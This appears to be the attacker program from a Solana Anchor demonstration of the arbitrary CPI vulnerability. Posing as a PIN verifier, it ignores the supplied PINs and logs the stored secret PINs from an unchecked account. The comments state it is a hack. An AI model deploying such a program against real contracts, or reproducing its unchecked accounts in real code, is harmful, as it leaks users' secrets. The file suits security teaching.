use anchor_lang::prelude::*;

declare_id!("3GMAZzXo4PBGkAX6iqLx8qq7H8oU3fz6KVNAnz2Ctg1g");

#[program]
pub mod arbitrary_cpi_hacked {
    use super::*;

    pub fn verify_pin(
        ctx: Context<VerifyPin>,
        _pin1: u8,
        _pin2: u8,
        _pin3: u8,
        _pin4: u8,
    ) -> Result<()> {
        let secret =
            SecretInformation::try_from_slice(&ctx.accounts.secret_information.data.borrow()[8..])?;

        msg!("Secret Pin1 is: {}", secret.pin1);
        msg!("Secret Pin2 is: {}", secret.pin2);
        msg!("Secret Pin3 is: {}", secret.pin3);
        msg!("Secret Pin4 is: {}", secret.pin4);

        Ok(())
    }
}

#[derive(Accounts)]
pub struct VerifyPin<'info> {
    /// CHECK: we hack we dont care
    pub author: AccountInfo<'info>,
    /// CHECK: we hack we dont care
    pub secret_information: AccountInfo<'info>,
}

#[account]
pub struct SecretInformation {
    pub author: Pubkey,
    pub pin1: u8,
    pub pin2: u8,
    pub pin3: u8,
    pub pin4: u8,
}
